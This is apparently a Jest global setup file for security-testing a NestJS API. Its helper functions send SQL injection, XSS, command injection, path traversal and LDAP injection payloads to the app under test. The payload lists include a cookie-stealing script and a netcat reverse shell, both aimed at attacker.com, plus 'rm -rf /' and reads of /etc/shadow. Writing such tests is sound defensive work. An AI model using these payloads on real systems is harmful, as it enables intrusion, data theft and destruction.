/**
 * 安全测试全局设置
 * 专门用于安全漏洞测试的环境配置
 */
import { Test } from "@nestjs/testing";
import { INestApplication, ValidationPipe } from "@nestjs/common";
import { MongoMemoryServer } from "mongodb-memory-server";
import * as request from "supertest";
import { jest } from "@jest/globals";
import * as express from "express";

// 动态导入AppModule
import { AppModule } from "../../src/app.module";
import { CustomLogger } from "../../src/common/config/logger.config";
import { GlobalExceptionFilter } from "../../src/common/core/filters";
import {
  ResponseInterceptor,
  RequestTrackingInterceptor,
} from "../../src/common/core/interceptors";

import { InfrastructureInterceptor } from "../../src/monitoring/infrastructure/interceptors/infrastructure.interceptor";
import { CollectorService } from "../../src/monitoring/collector/collector.service";
import { UserRepository } from "../../src/auth/repositories/user.repository";
import { PasswordService } from "../../src/auth/services/password.service";
import { UserRole, Permission } from "../../src/auth/enums/user-role.enum";
import { ApiKeyService } from "../../src/auth/services/apikey.service";
import { JwtService } from "@nestjs/jwt";
import { ThrottlerModule } from "@nestjs/throttler";
import mongoose from "mongoose";

let app: INestApplication;
let mongoServer: MongoMemoryServer;

// 设置安全测试超时
jest.setTimeout(30000);

// 安全测试需要完整的应用环境
beforeAll(async () => {
  console.log("🔒 启动安全测试环境...");

  try {
    // 启动MongoDB内存服务器
    mongoServer = await MongoMemoryServer.create({
      instance: {
        dbName: "test-security",
        port: 27021,
      },
    });

    const mongoUri = mongoServer.getUri();
    process.env.MONGODB_URI = mongoUri;

    // 为测试设置一个较低的速率限制阈值
    process.env.IP_RATE_LIMIT_MAX = "15";

    console.log(`✅ 安全测试MongoDB启动: ${mongoUri}`);

    // 创建测试模块
    const testModule = await Test.createTestingModule({
      imports: [
        AppModule,
        ThrottlerModule.forRoot([
          {
            ttl: 60000,
            limit: 200, // 提高测试环境的全局速率限制，避免大部分测试被意外限流
          },
        ]),
      ],
    }).compile();

    // 创建应用实例
    app = testModule.createNestApplication();

    // =================================================================
    // == 复现 main.ts 中的应用配置，确保测试环境与真实环境一致 ==
    // =================================================================

    app.useLogger(new CustomLogger("NestApplication.Test"));

    app.use("/api", express.json({ limit: "10mb" }));
    app.use("/api", express.urlencoded({ limit: "10mb", extended: true }));



    app.setGlobalPrefix("api/v1", { exclude: ["/docs"] });

    app.useGlobalFilters(new GlobalExceptionFilter());

    app.useGlobalPipes(
      new ValidationPipe({
        transform: true,
        whitelist: true,
        forbidNonWhitelisted: true,
        exceptionFactory: (errors) => {
          return new ValidationPipe().createExceptionFactory()(errors);
        },
      }),
    );

    app.useGlobalInterceptors(new RequestTrackingInterceptor());

    const performanceMonitor = app.get(CollectorService);
    const reflector = app.get("Reflector");
    app.useGlobalInterceptors(
      new InfrastructureInterceptor(performanceMonitor, reflector),
    );

    app.useGlobalInterceptors(new ResponseInterceptor());

    global["CollectorService"] = performanceMonitor;

    // 安全测试的CORS配置
    const whitelist = ["https://trusted.com", "http://localhost:3000"];
    app.enableCors({
      origin: (origin, callback) => {
        if (!origin || whitelist.indexOf(origin) !== -1) {
          callback(null, true);
        } else {
          callback(new Error("Not allowed by CORS"));
        }
      },
      methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"],
      allowedHeaders: [
        "Content-Type",
        "Authorization",
        "X-App-Key",
        "X-Access-Token",
        "X-Requested-With",
        "Origin",
        "Accept",
      ],
      credentials: true,
    });

    // 启动应用
    await app.init();

    console.log("✅ 安全测试应用启动完成");

    // 等待应用稳定
    await new Promise((resolve) => setTimeout(resolve, 2000));
  } catch (error) {
    console.error("❌ 安全测试环境启动失败:", error);
    throw error;
  }
});

// 每个安全测试前的准备
beforeEach(async () => {
  try {
    // 清理数据库数据
    if (mongoose.connection.readyState === 1) {
      const collections = mongoose.connection.collections;

      // 并行清理所有集合以提高性能
      const cleanupPromises = Object.keys(collections).map(async (key) => {
        try {
          await collections[key].deleteMany({});
        } catch (err) {
          console.warn(`⚠️ 清理集合 ${key} 失败:`, err.message);
        }
      });

      await Promise.all(cleanupPromises);
    }

    // 清理Redis缓存
    const redis = app.get("REDIS_CLIENT", { strict: false });
    if (redis) {
      await redis.flushdb();
    }
  } catch (error) {
    console.warn("⚠️ 安全测试数据清理失败:", error.message);
  }
});

// 每个测试后清理
afterEach(() => {
  jest.clearAllMocks();
});

// 安全测试完成后清理
afterAll(async () => {
  console.log("🧹 清理安全测试环境...");

  const cleanup = async () => {
    try {
      // 1. 清理Redis连接 (最先清理，避免缓存阻塞)
      console.log("🔄 [清理] 关闭Redis连接...");
      try {
        const redis = app?.get("REDIS_CLIENT", { strict: false });
        if (redis && typeof redis.quit === "function") {
          await Promise.race([
            redis.quit(),
            new Promise((resolve) => setTimeout(resolve, 2000)),
          ]);
        }
        console.log("✅ [清理] Redis连接已关闭");
      } catch (redisError) {
        console.warn("⚠️ [清理] Redis关闭失败:", redisError.message);
      }

      // 2. 清理数据库连接
      console.log("🔄 [清理] 关闭数据库连接...");
      try {
        if (mongoose.connection.readyState === 1) {
          await Promise.race([
            mongoose.connection.close(),
            new Promise((resolve) => setTimeout(resolve, 3000)),
          ]);
        }
        console.log("✅ [清理] 数据库连接已关闭");
      } catch (dbError) {
        console.warn("⚠️ [清理] 数据库关闭失败:", dbError.message);
      }

      // 3. 关闭NestJS应用
      console.log("🔄 [清理] 关闭NestJS应用...");
      if (app) {
        await Promise.race([
          app.close(),
          new Promise((resolve) => setTimeout(resolve, 5000)),
        ]);
        console.log("✅ [清理] NestJS应用已关闭");
      }

      // 4. 关闭测试模块 - 不再需要，因为我们没有创建独立的测试模块
      /*
      console.log('🔄 [清理] 关闭测试模块...');
      if (testModule) {
        await Promise.race([
          testModule.close(),
          new Promise(resolve => setTimeout(resolve, 3000))
        ]);
        console.log('✅ [清理] 测试模块已关闭');
      }
      */

      // 5. 停止MongoDB内存服务器
      console.log("🔄 [清理] 停止MongoDB内存服务器...");
      if (mongoServer) {
        await Promise.race([
          mongoServer.stop(),
          new Promise((resolve) => setTimeout(resolve, 5000)),
        ]);
        console.log("✅ [清理] MongoDB内存服务器已停止");
      }

      // 6. 清理Jest定时器和模拟
      jest.clearAllTimers();
      jest.clearAllMocks();

      console.log("✅ [清理] 安全测试环境清理完成");
    } catch (error) {
      console.error("❌ [清理] 安全测试环境清理失败:", error);
      throw error;
    }
  };

  // 使用超时保护的清理函数
  try {
    await Promise.race([
      cleanup(),
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error("清理超时")), 25000),
      ),
    ]);
  } catch (error) {
    console.error("❌ [清理] 清理过程超时或失败:", error.message);
    // 强制退出，不要让测试挂起
    process.exit(0);
  }
}, 30000); // 增加afterAll超时到30秒

// 安全测试专用工具函数
global.getSecurityApp = () => app;

global.createSecurityRequest = () => {
  if (!app) {
    throw new Error("安全测试应用未启动");
  }
  return request(app.getHttpServer());
};

// 常见的安全攻击载荷
global.SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "' UNION SELECT * FROM users --",
  "admin'--",
  "admin' /*",
  "' OR 1=1 --",
  "') OR '1'='1 --",
  "' OR '1'='1' ({",
  "'; INSERT INTO users VALUES ('hacker', 'password'); --",
];

global.XSS_PAYLOADS = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "javascript:alert('XSS')",
  "<svg/onload=alert('XSS')>",
  "<iframe src=javascript:alert('XSS')></iframe>",
  "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
  "\"><script>alert('XSS')</script>",
  "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
];

global.COMMAND_INJECTION_PAYLOADS = [
  "; ls -la",
  "| cat /etc/passwd",
  "&& cat /etc/shadow",
  "; rm -rf /",
  "` cat /etc/hosts `",
  "$(cat /etc/passwd)",
  "; nc -e /bin/sh attacker.com 4444",
];

global.PATH_TRAVERSAL_PAYLOADS = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "../../../../../../../../../../etc/passwd%00",
];

global.LDAP_INJECTION_PAYLOADS = [
  "*)(uid=*))(|(uid=*",
  "*)(|(password=*))",
  "admin)(&(password=*))",
  "*))%00",
];

// 安全测试助手函数
global.testSQLInjection = async (
  endpoint: string,
  parameter: string,
  method: string = "POST",
) => {
  const results = [];

  for (const payload of global.SQL_INJECTION_PAYLOADS) {
    const testData = { [parameter]: payload };

    try {
      const response = await request(app.getHttpServer())
        [method.toLowerCase()](endpoint)
        .send(testData);

      results.push({
        payload,
        status: response.status,
        // 判断漏洞：成功状态码或者data字段包含有效数据（不为null）
        vulnerable:
          response.status === 200 ||
          (response.body?.data !== null && response.body?.data !== undefined),
      });
    } catch (error) {
      results.push({
        payload,
        status: error.status || 500,
        vulnerable: false,
        error: error.message,
      });
    }
  }

  return results;
};

global.testXSS = async (
  endpoint: string,
  parameter: string,
  method: string = "POST",
) => {
  const results = [];

  for (const payload of global.XSS_PAYLOADS) {
    const testData = { [parameter]: payload };

    try {
      const response = await request(app.getHttpServer())
        [method.toLowerCase()](endpoint)
        .send(testData);

      const responseText = JSON.stringify(response.body);
      const vulnerable =
        responseText.includes("<script>") ||
        responseText.includes("javascript:") ||
        responseText.includes("onerror=") ||
        responseText.includes("onload=");

      results.push({
        payload,
        status: response.status,
        vulnerable,
        response: response.body,
      });
    } catch (error) {
      results.push({
        payload,
        status: error.status || 500,
        vulnerable: false,
        error: error.message,
      });
    }
  }

  return results;
};

global.testRateLimiting = async (endpoint: string, requests: number = 100) => {
  const results = [];
  const startTime = Date.now();

  const promises = Array(requests)
    .fill(0)
    .map(async (_, index) => {
      try {
        const response = await request(app.getHttpServer())
          .get(endpoint)
          .timeout(5000);

        return {
          request: index + 1,
          status: response.status,
          timestamp: Date.now() - startTime,
          rateLimited: response.status === 429,
        };
      } catch (error) {
        return {
          request: index + 1,
          status: error.status || 500,
          timestamp: Date.now() - startTime,
          rateLimited: error.status === 429,
          error: error.message,
        };
      }
    });

  const responses = await Promise.allSettled(promises);

  responses.forEach((result) => {
    if (result.status === "fulfilled") {
      results.push(result.value);
    } else {
      results.push({
        status: 500,
        error: result.reason.message,
        timestamp: Date.now() - startTime,
      });
    }
  });

  return results;
};

/**
 * 创建一个已认证的用户并返回用户实体和JWT令牌
 */
global.createAuthenticatedUser = async (payload: {
  username?: string;
  role: UserRole;
  email?: string;
  isActive?: boolean;
}) => {
  const userRepository = app.get(UserRepository);
  const passwordService = app.get(PasswordService);
  const jwtService = app.get(JwtService);

  const username = payload.username || `test-user-${Date.now()}`;
  const email = payload.email || `${username}@test.com`;

  const hashedPassword = await passwordService.hashPassword("password123");

  // 1. 创建用户
  const user = await userRepository.create({
    username,
    email,
    passwordHash: hashedPassword,
    role: payload.role,
    isActive: payload.isActive ?? true,
  });

  // 2. 创建令牌
  const tokenPayload = {
    sub: user.id,
    username: user.username,
    role: user.role,
  };
  const token = await jwtService.signAsync(tokenPayload);

  return { user, token };
};

/**
 * 创建一个用于测试的JWT令牌
 */
global.createTestJWTToken = async (payload: {
  sub?: string;
  username?: string;
  role: UserRole;
  permissions?: Permission[];
}) => {
  const jwtService = app.get(JwtService);
  const finalPayload = {
    sub: payload.sub || new mongoose.Types.ObjectId().toHexString(),
    username: payload.username || "test-user",
    ...payload,
  };
  return jwtService.signAsync(finalPayload);
};

/**
 * 全局函数: 创建一个拥有特定权限的API Key
 * @param options - API Key的选项，例如 { permissions: [Permission.PROVIDERS_READ] }
 * @returns {Promise<{ appKey: string, accessToken: string }>}
 */
global.createTestApiKey = async (options?: { permissions?: Permission[] }) => {
  const apiKeyService = app.get(ApiKeyService);
  const jwtService = app.get(JwtService);

  // 需要一个管理员用户来创建API Key
  const adminPayload = {
    username: "temp_admin_for_key_creation",
    role: UserRole.ADMIN,
    sub: new mongoose.Types.ObjectId().toHexString(),
  };
  const adminToken = await jwtService.signAsync(adminPayload);
  const { sub } = jwtService.decode(adminToken) as { sub: string };

  const apiKeyData = {
    name: `test-key-${Date.now()}`,
    permissions: options?.permissions || [],
  };

  const createdApiKey = await apiKeyService.createApiKey(sub, apiKeyData);
  return {
    appKey: createdApiKey.appKey,
    accessToken: createdApiKey.accessToken,
    id: (createdApiKey as any).id,
  };
};

/**
 * 全局函数: 创建一个拥有管理员权限的API Key
 * @returns {Promise<{ appKey: string, accessToken: string }>}
 */
global.createTestAdminApiKey = async () => {
  // 复用通用的API Key创建函数
  return global.createTestApiKey({ permissions: [Permission.SYSTEM_ADMIN] });
};

// 抑制非错误日志输出
const originalConsole = console;
global.console = {
  ...originalConsole,
  log: jest.fn(),
  debug: jest.fn(),
  info: jest.fn(),
  warn: jest.fn(),
  error: originalConsole.error, // 保留错误输出
};
